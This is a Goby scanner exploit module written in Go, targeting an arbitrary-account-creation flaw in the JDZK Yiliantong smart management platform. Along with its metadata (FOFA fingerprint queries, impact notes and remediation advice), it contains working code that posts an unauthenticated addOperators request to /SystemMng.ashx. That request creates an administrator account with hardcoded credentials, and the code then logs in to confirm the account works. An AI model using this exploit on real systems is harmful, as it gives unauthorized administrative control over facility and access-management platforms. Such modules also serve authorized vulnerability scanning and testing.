package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JDZK Yiliantong Smart Management Platform Add any account Vulnerability",
    "Description": "<p>JDZK Yiliantong intelligent management platform is a set of Yiliantong system with powerful functions, stable operation, simple and convenient operation, beautiful user interface, and easy statistical data. No need to install, just configure in the background to log in in the browser.</p><p>There is an arbitrary account addition vulnerability in the JDZK Yiliantong smart management platform. An attacker can use this vulnerability to add an administrator account and obtain system permissions.</p>",
    "Product": "JDZK-Yiliantong-Smart-MP",
    "Homepage": "https://www.szjiedao.com/",
    "DisclosureDate": "2023-02-22",
    "PostTime": "2023-11-20",
    "Author": "橘先生",
    "FofaQuery": "body=\"UserReservedTest.aspx\" || body=\"View/SystemMng/PwdChanges.aspx\"",
    "GobyQuery": "body=\"UserReservedTest.aspx\" || body=\"View/SystemMng/PwdChanges.aspx\"",
    "Level": "2",
    "Impact": "<p>There is an arbitrary account addition vulnerability in the JDZK Yiliantong smart management platform. An attacker can use this vulnerability to add an administrator account and obtain system permissions.</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.szjiedao.com/\">https://www.szjiedao.com/</a></p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "register",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "mxg30958",
            "show": "attackType=register"
        },
        {
            "name": "password",
            "type": "input",
            "value": "85903gxm",
            "show": "attackType=register"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "HW-2023"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "脸爱云一脸通智慧管理平台任意账号添加漏洞",
            "Product": "JDZK-一脸通智慧管理平台",
            "Description": "<p>脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。<br></p><p>脸爱云一脸通智慧管理平台存在任意账号添加漏洞，攻击者可通过该漏洞添加管理员账号，获取系统权限。<br></p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.szjiedao.com/\">https://www.szjiedao.com/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>脸爱云一脸通智慧管理平台存在任意账号添加漏洞，攻击者可通过该漏洞添加管理员账号，获取系统权限。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "JDZK Yiliantong Smart Management Platform Add any account Vulnerability",
            "Product": "JDZK-Yiliantong-Smart-MP",
            "Description": "<p>JDZK Yiliantong intelligent management platform is a set of Yiliantong system with powerful functions, stable operation, simple and convenient operation, beautiful user interface, and easy statistical data. No need to install, just configure in the background to log in in the browser.</p><p>There is an arbitrary account addition vulnerability in the JDZK Yiliantong smart management platform. An attacker can use this vulnerability to add an administrator account and obtain system permissions.<br></p>",
            "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.szjiedao.com/\" target=\"_blank\">https://www.szjiedao.com/</a></p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is an arbitrary account addition vulnerability in the JDZK Yiliantong smart management platform. An attacker can use this vulnerability to add an administrator account and obtain system permissions.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10878"
}`
	sendPayloadPAQWAXZMHG := func(hostInfo *httpclient.FixUrl, data, cookie string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/SystemMng.ashx")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Cookie", cookie)
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		postRequestConfig.Data = data
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	doLoginDMPOQIWUEZX := func(hostInfo *httpclient.FixUrl, username, password string) (bool, error) {
		loginResponse, loginErr := sendPayloadPAQWAXZMHG(hostInfo, fmt.Sprintf("name=%s&pwd=%s&keeps=0&funcName=UserLogin", username, password), "")
		if loginErr != nil {
			return false, loginErr
		}
		if loginResponse.StatusCode == 200 && strings.Contains(loginResponse.Utf8Html, "1") && len(loginResponse.Cookie) > 0 {
			checkResponse, checkErr := sendPayloadPAQWAXZMHG(hostInfo, "funcName=getLoginName", loginResponse.Cookie)
			if checkErr != nil {
				return false, checkErr
			}
			return checkResponse.StatusCode == 200 && strings.Contains(checkResponse.Utf8Html, username) && strings.Contains(checkResponse.Utf8Html, `"name":`), nil
		}
		return false, nil
	}

	registerAccountXPOIWEASD := func(hostInfo *httpclient.FixUrl, username, password string) (bool, error) {
		registerData := "operatorName=" + username + "&operatorPwd=" + password + "&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators"
		registerResponse, registerErr := sendPayloadPAQWAXZMHG(hostInfo, registerData, "")
		if registerErr != nil {
			return false, registerErr
		}
		return registerResponse.StatusCode == 200 && strings.Contains(registerResponse.Utf8Html, "1"), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			username := "mxg30958"
			password := "85903gxm"
			if success, _ := doLoginDMPOQIWUEZX(hostInfo, username, password); success {
				return success
			}
			if success, _ := registerAccountXPOIWEASD(hostInfo, username, password); success {
				if success, _ := doLoginDMPOQIWUEZX(hostInfo, username, password); success {
					return success
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "register" {
				username := goutils.B2S(stepLogs.Params["username"])
				password := goutils.B2S(stepLogs.Params["password"])
				if success, err := registerAccountXPOIWEASD(expResult.HostInfo, username, password); err != nil {
					expResult.Output = err.Error()
				} else if success {
					if success, err := doLoginDMPOQIWUEZX(expResult.HostInfo, username, password); err != nil {
						expResult.Output = err.Error()
					} else if success {
						expResult.Success = true
						expResult.Output = fmt.Sprintf(`Username: %s\nPassword: %s`, username, password)
					} else {
						expResult.Output = `漏洞利用失败`
					}
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
